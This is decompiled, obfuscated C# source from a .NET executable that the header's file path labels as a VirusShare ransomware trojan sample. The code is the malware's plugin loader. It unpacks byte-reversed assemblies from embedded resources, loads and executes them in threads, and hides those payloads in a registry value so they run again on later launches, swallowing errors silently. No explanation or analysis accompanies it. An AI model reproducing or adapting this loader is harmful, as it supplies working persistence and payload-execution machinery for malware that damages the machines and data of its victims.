// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.๏ތϯٯ౑कᮆᣯ൷ᶁ฿˒ϠðẆᏎ
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using Microsoft.Win32;
using Plugin;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  public class \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ
  {
    public static SortedList<Guid, byte[]> ᮆᑌ᳭ᨥᖡᛧ = new SortedList<Guid, byte[]>();
    public static SortedList<Guid, IPlugin> ಉ᮵\u02E6ǱϞʇਔྜڟ = new SortedList<Guid, IPlugin>();
    private static string \u05A7\u1809\u0D71ዘငʉᄚ = string.Empty;

    public static event \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u0C71ಁ\u0862\u0CDAៜ\u1C8Fᯁบᅦ\u0004ՍR᳙ᣋ̣ࠠ\u104B႗ᦕ PluginAdded;

    public static void ჩҤူᛶᛄ֫᪑\u0FDC()
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream serializationStream = new MemoryStream();
        binaryFormatter.Serialize((Stream) serializationStream, (object) \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᮆᑌ᳭ᨥᖡᛧ);
        serializationStream.Close();
        byte[] numArray = \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.ᴅᏗᔇߍᝃ\u177Cᇋ߁ുɵḇ\u175Eଢ\u08BBᘰᔫೖ(serializationStream.ToArray(), false);
        if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.Ś۶თ\u10CF\u0F0Bἒᯢਦѕࣸ\u1736 == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u1CB9\u16FB\u1C4CܙǃᏡ\u0A44\u10CAೞထᓭ\u08E1Ցːࠤᒇ).SetValue(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᬖ\u1775\u17D5ᚲᯜᝢක, (object) numArray);
        else
          Registry.LocalMachine.CreateSubKey(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u1CB9\u16FB\u1C4CܙǃᏡ\u0A44\u10CAೞထᓭ\u08E1Ցːࠤᒇ).SetValue(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᬖ\u1775\u17D5ᚲᯜᝢක, (object) numArray);
      }
      catch
      {
      }
    }

    public static void ᑇʤዾ\u1AC0Άឲ᥉Ϋሡޯ٘ᱝ\u061Eᢶᔬ() => new Thread((ThreadStart) (() =>
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream memoryStream;
        byte[] numArray1;
        if (\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.Ś۶თ\u10CF\u0F0Bἒᯢਦѕࣸ\u1736 == RegistryHive.CurrentUser)
        {
          MemoryStream serializationStream = new MemoryStream(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.Ꮷ\u0DCCڪᘺౢᇺ\u1AFEơॊ(Registry.CurrentUser.CreateSubKey(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u1CB9\u16FB\u1C4CܙǃᏡ\u0A44\u10CAೞထᓭ\u08E1Ցːࠤᒇ).GetValue(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᬖ\u1775\u17D5ᚲᯜᝢක) as byte[], false));
          \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᮆᑌ᳭ᨥᖡᛧ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        else
        {
          MemoryStream serializationStream = new MemoryStream(\u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB.Ꮷ\u0DCCڪᘺౢᇺ\u1AFEơॊ(Registry.LocalMachine.CreateSubKey(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u1CB9\u16FB\u1C4CܙǃᏡ\u0A44\u10CAೞထᓭ\u08E1Ցːࠤᒇ).GetValue(\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.ᬖ\u1775\u17D5ᚲᯜᝢක) as byte[], false));
          \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᮆᑌ᳭ᨥᖡᛧ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        foreach (byte[] numArray2 in (IEnumerable<byte[]>) \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᮆᑌ᳭ᨥᖡᛧ.Values)
          \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.Փ\u087CᔤBᔑᢻᚐᮨᕋᰐឪᳳẊþ\u0DC8ảഞἡ(numArray2);
      }
      catch
      {
      }
    })).Start();

    public static void ဉᴶᑞెᑦᰗਵἛ() => new Thread((ThreadStart) (() =>
    {
      try
      {
        if (Assembly.GetExecutingAssembly().GetManifestResourceNames().Length == 0)
          return;
        ResourceManager resourceManager = new ResourceManager("p", Assembly.GetExecutingAssembly());
        int num = (int) resourceManager.GetObject("Len");
        for (int index = 0; index < num; ++index)
        {
          byte[] numArray = (byte[]) resourceManager.GetObject(index.ToString());
          Array.Reverse((Array) numArray);
          \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.Փ\u087CᔤBᔑᢻᚐᮨᕋᰐឪᳳẊþ\u0DC8ảഞἡ(numArray);
        }
        if (!\u0306๔\u196Fሇ\u19F0᳧ͅɣļᔃ\u1C88ேR.\u1DCCआௐӰኒ\u0E74ޖᢶឪ\u1AAAᘇᯝҭ\u19DAፗấ)
          return;
        \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ჩҤူᛶᛄ֫᪑\u0FDC();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    })).Start();

    public static bool Փ\u087CᔤBᔑᢻᚐᮨᕋᰐឪᳳẊþ\u0DC8ảഞἡ(byte[] _param0)
    {
      try
      {
        foreach (Type type in Assembly.Load(_param0).GetTypes())
        {
          int num = 0;
          if (type.IsClass && type.IsSubclassOf(typeof (IPlugin)))
          {
            IPlugin instance = (IPlugin) Activator.CreateInstance(type);
            if (instance.ExecuteOnLoad)
            {
              instance.Initialize();
              \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ࢱĝᅹসࠂᄏᄀṟ\u1AF1̚ᳪᢓī\u0A04ঊ((object) null, instance, instance.ExecuteOnLoadArgs);
            }
            if (!\u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᮆᑌ᳭ᨥᖡᛧ.ContainsKey(instance.Guid))
              \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᮆᑌ᳭ᨥᖡᛧ.Add(instance.Guid, _param0);
            else
              ++num;
            if (!\u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ಉ᮵\u02E6ǱϞʇਔྜڟ.ContainsKey(instance.Guid))
              \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ಉ᮵\u02E6ǱϞʇਔྜڟ.Add(instance.Guid, instance);
            else
              ++num;
            \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u05A7\u1809\u0D71ዘငʉᄚ = string.Empty;
            if (num == 2)
            {
              \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u05A7\u1809\u0D71ዘငʉᄚ = instance.Name + ": Already Stored";
              return false;
            }
            if (\u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᱼ\u0CD1ᅆḘဟᡳʍ\u1808᪄ٲ\u08DC != null)
              \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᱼ\u0CD1ᅆḘဟᡳʍ\u1808᪄ٲ\u08DC((object) null, instance);
            return true;
          }
        }
        \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u05A7\u1809\u0D71ዘငʉᄚ = "Class with IPlugin interface not found...";
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u05A7\u1809\u0D71ዘငʉᄚ = ex.Message;
      }
      return false;
    }

    public static bool އӅኄொɪᒪ\u1A7Eንᇱ(IPlugin _param0)
    {
      if (!\u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ಉ᮵\u02E6ǱϞʇਔྜڟ.ContainsKey(_param0.Guid))
      {
        \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ಉ᮵\u02E6ǱϞʇਔྜڟ.Add(_param0.Guid, _param0);
        \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u05A7\u1809\u0D71ዘငʉᄚ = string.Empty;
        if (\u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᱼ\u0CD1ᅆḘဟᡳʍ\u1808᪄ٲ\u08DC != null)
          \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᱼ\u0CD1ᅆḘဟᡳʍ\u1808᪄ٲ\u08DC((object) null, _param0);
        return true;
      }
      \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u05A7\u1809\u0D71ዘငʉᄚ = _param0.Name + ": Already Stored";
      return false;
    }

    public static void ઙᧀ\u19EFᗖᷥҩ\u10CB\u1C96\u0AE5Ḩ\u1396ᜃ\u1B78᪄ዘળ\u0A76ᚴ(Guid _param0)
    {
      if (!\u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ಉ᮵\u02E6ǱϞʇਔྜڟ.ContainsKey(_param0))
        return;
      \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ᮆᑌ᳭ᨥᖡᛧ.Remove(_param0);
      \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.ಉ᮵\u02E6ǱϞʇਔྜڟ.Remove(_param0);
    }

    public static string ᵬ៉\u00A1\u10CAӀᙩᎈ() => \u0E4Fތϯٯ\u0C51कᮆᣯ\u0D77ᶁ\u0E3F\u02D2ϠðẆᏎ.\u05A7\u1809\u0D71ዘငʉᄚ;

    public static void ࢱĝᅹসࠂᄏᄀṟ\u1AF1̚ᳪᢓī\u0A04ঊ(
      object _param0,
      IPlugin _param1,
      PluginArgs _param2)
    {
      new Thread((ThreadStart) (() =>
      {
        try
        {
          _param1.Execute(_param0, _param2);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.Message);
        }
      })).Start();
    }

    public delegate void \u0C71ಁ\u0862\u0CDAៜ\u1C8Fᯁบᅦ\u0004ՍR᳙ᣋ̣ࠠ\u104B႗ᦕ(
      object _param1,
      IPlugin _param2);
  }
}
